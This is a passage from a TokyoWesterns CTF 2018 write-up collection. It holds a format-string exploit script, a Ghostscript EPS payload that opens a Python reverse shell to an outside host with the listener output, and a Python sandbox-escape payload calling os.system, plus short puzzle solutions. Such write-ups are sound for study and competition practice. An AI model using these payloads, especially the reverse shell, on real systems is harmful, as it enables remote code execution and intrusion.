            p.sendline('%{}c%11$hhn'.format(ord(new_ip_packed[0]) + x))
        # points to libc value
        p.sendline('%{}c%9$hhn'.format(base))
        p.info('modify %x to %x' % (stderr_vtable, wstr_jump_table))
        # modify libc value to stderr's vtable
        x = 0
        stderr_vtable_packed = p64(stderr_vtable)
        for i in stderr_vtable_packed[:6]:
            x += 1
            p.sendline('%{}c%11$hhn'.format(ord(i)))
            p.sendline('%{}c%9$hhn'.format(base + x))
        x = 0
        if False:
            p.sendline('break me')
            p.recvuntil('break me')
            raw_input('break me')
        p.sendline('%{}c%9$hhn'.format(base))
        p.sendline('%{}c%5$hn'.format(u16(p64(wstr_jump_table)[:2])))
        p.sendline('%40000c')
        p.recv()
        p.sendline('echo wtf')
        try:
            p.recvuntil('wtf', timeout=3)
        except:
            return False
        p.sendline('ls')
        p.recv()
        p.sendline('cat flag')
        p.interactive()
        return True
    def bruteforce():
        if DEBUG:
            p = remote('localhost', 12121)
            main(p, '10', 'a')
            return
        while True:
            try:
                with remote('neighbor.chal.ctf.westerns.tokyo', 37565) as p:
                #with remote('localhost', 12121) as p:
                    if main(p, 0x10, 'a'):
                        return
            except KeyboardInterrupt as e:
                raise e
            except:
                pass
    if __name__ == '__main__':
        bruteforce()
## welcome |Misc
签到题
## dec dec dec | reverse
一次base64，一次rot13，一次魔改base64，解密即可。
## mondai.zip | misc
First password: y0k0s0 (filename is y0k0s0.zip)  
Second password: We1come (bytearray of char(192.168.11.5 echo request size))  
Third password: eVjbtTpvkU ([i for i in file(“list.txt”).read().split(‘n’)]
and bruteforce)  
Forth password: happyhappyhappy (1c9ed78bab3f2d33140cbce7ea223894 md5 hash
crack)  
Fifth password: to (bruteforce zip file)  
TWCTF{We1come_to_y0k0s0_happyhappyhappy_eVjbtTpvkU}
## vimshell | misc
chrome -app=
Ctrl + W -> :! cat /flag  
## slack emoji converter | web
We can get the sourcecode just by looking at the sourcecode of the index page.  
source –> shows the following data :-
    from flask import (
        Flask,
        render_template,
        request,
        redirect,
        url_for,
        make_response,
    )
    from PIL import Image
    import tempfile
    import os
    app = Flask(__name__)
    @app.route('/')
    def index():
        return render_template('index.html')
    @app.route('/source')
    def source():
        return open(__file__).read()
    @app.route('/conv', methods=['POST'])
    def conv():
        f = request.files.get('image', None)
        if not f:
            return redirect(url_for('index'))
        ext = f.filename.split('.')[-1]
        fname = tempfile.mktemp("emoji")
        fname = "{}.{}".format(fname, ext)
        f.save(fname)
        img = Image.open(fname)
        w, h = img.size
        r = 128/max(w, h)
        newimg = img.resize((int(w*r), int(h*r)))
        newimg.save(fname)
        response = make_response()
        response.data = open(fname, "rb").read()
        response.headers['Content-Disposition'] = 'attachment; filename=emoji_{}'.format(f.filename)
        os.unlink(fname)
        return response
    if __name__ == '__main__':
        app.run(host="0.0.0.0", port=8080, debug=True)
Well, as you noticed, the code itself is not vulnerable. But if you ever
noticed, it uses the PIL library which has been known to have RCEs by
maliciously crafting image
([CVE-2017-8291](https://github.com/vulhub/vulhub/tree/master/python/PIL-CVE-2017-8291)).  
However, this CVE-2017-8291 is outdated. This CTF is running in September
2018. Many of people should’ve been stuck here.  
I’ve been searching on google and found this interesting [issue
request](http://seclists.org/oss-sec/2018/q3/142) that was written in
seclists.org last month.  
But Just copy and pasting the PoC does not give you the flag. You need to
craft it a little further and make it suitable for the challenge server to
recognize the file.  
(But seriously, this challenge is a 1day exploit challenge and this 1day is
not assigned by CVE yet. How awesome is that?)  
In my case, I used the following ghostscript file and uploaded it onto the
server.
    %!PS-Adobe-3.0 EPSF-3.0
    %%BoundingBox: 0 0 30 30
    userdict /setpagedevice undef
    save
    legal
    { null restore } stopped { pop } if
    { legal } stopped { pop } if
    restore
    mark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("harold.kim",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);') currentdevice putdeviceprops
The result? well…
    root@imouto-router:/# nc -vlp 8080
    Listening on [0.0.0.0] (family 0, port 8080)
    Connection from 45.123.200.35.bc.googleusercontent.com 53674 received!
    /bin/sh: 0: can't access tty; job control turned off
    $ cat /flag
    TWCTF{watch_0ut_gh0stscr1pt_everywhere}$ id
    uid=1000(emoji) gid=1000(emoji) groups=1000(emoji)
    $ exit
    root@imouto-router:/#
## py sandbox | misc
The objective of this challenge is nothing but to bypass the ast filters and
execute the flag.  
In this challenge, I used the following payload to solve both challenges.
    pysandbox1: [1,2,3,4][1:__import__("os").system("cat flag")]
    pysandbox2: [1,2,3,4][1:__import__("os").system("cat flag2")]
How it works?  
First we need to look at what kind of attributes are checked within the
check() function.
                'BoolOp': ['values'],
                'BinOp': ['left', 'right'],
                'UnaryOp': ['operand'],
                'Lambda': ['body'],
                'IfExp': ['test', 'body', 'orelse'],
                'Dict': ['keys', 'values'],
                'Set': ['elts'],
                'ListComp': ['elt', 'generators'],
                'SetComp': ['elt', 'generators'],
                'DictComp': ['key', 'value', 'generators'],
                'GeneratorExp': ['elt', 'generators'],
                'Yield': ['value'],
                'Compare': ['left', 'comparators'],
                'Call': False, # call is not permitted
                'Repr': ['value'],
                'Num': True,
                'Str': True,
                'Attribute': False, # attribute is also not permitted
                'Subscript': ['value'],
                'Name': True,
                'List': ['elts'],
                'Tuple': ['elts'],
                'Expr': ['value'], # root node 
                'comprehension': ['target', 'iter', 'ifs'],
And this check() is run recursively so you can’t even use any of above ast
types.  
My approach was to analyze the ast attributes from the input by dumping the
parsed variables ast.dump(ast.parse(stdin))`  
So I modified a bit of the challenge script to start debugging..
    root@stypr-200109:~# python x.py
    [1,2,3]
    Module(body=[Expr(value=List(elts=[Num(n=1), Num(n=2), Num(n=3)], ctx=Load()))])
Above code obviously works because it meets the criteria.
    root@stypr-200109:~# python x.py
    [1,2,3,4][1:__import__('os').system('ls')]
    Module(body=[Expr(value=Subscript(value=List(elts=[Num(n=1), Num(n=2), Num(n=3), Num(n=4)], ctx=Load()), slice=Slice(lower=Num(n=1), upper=Call(func=Attribute(value=Call(func=Name(id='__import__', ctx=Load()), args=[Str(s='os')], keywords=[], starargs=None, kwargs=None), attr='system', ctx=Load()), args=[Str(s='ls')], keywords=[], starargs=None, kwargs=None), step=None), ctx=Load()))])
    x.py flag
Well, as you’ve seen, Slice is not included in the attribute check. So this
literally bypasses the check() function.  
exploiting this slice gives the flag :-
    root@stypr-200109:~# echo -e '[1,2,3,4][1:__import__("os").system("cat flag")]' | nc -v4 pwn1.chal.ctf.westerns.tokyo 30001
    Connection to pwn1.chal.ctf.westerns.tokyo 30001 port [tcp/*] succeeded!
    TWCTF{go_to_next_challenge_running_on_port_30002}
    []root@stypr-200109:~# cat a.txt | nc -v4 pwn1.chal.ctf.westerns.tokyo 30002 | tail -3 
    Connection to pwn1.chal.ctf.westerns.tokyo 30002 port [tcp/*] succeeded!
        sys.stdout.flush()
    TWCTF{baby_sandb0x_escape_with_pythons}
    []root@stypr-200109:~#
## BBQ old | pwn
与BBQ 相同。